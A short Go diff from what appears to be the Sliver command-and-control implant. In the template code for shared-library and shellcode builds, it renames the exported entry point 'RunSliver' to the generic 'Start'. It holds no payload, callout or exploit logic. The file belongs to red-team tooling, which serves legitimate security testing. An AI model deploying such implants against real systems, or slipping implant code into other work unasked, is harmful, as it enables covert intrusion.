@@ -117,9 +117,9 @@ func (serv *sliverService) Execute(args []string, r <-chan svc.ChangeRequest, ch
 // {{if or .Config.IsSharedLib .Config.IsShellcode}}
 var isRunning bool = false
 
-// RunSliver - Export for shared lib build
-//export RunSliver
-func RunSliver() {
+// Start - Export for shared lib build
+//export Start
+func Start() {
 	if !isRunning {
 		isRunning = true
 		main()
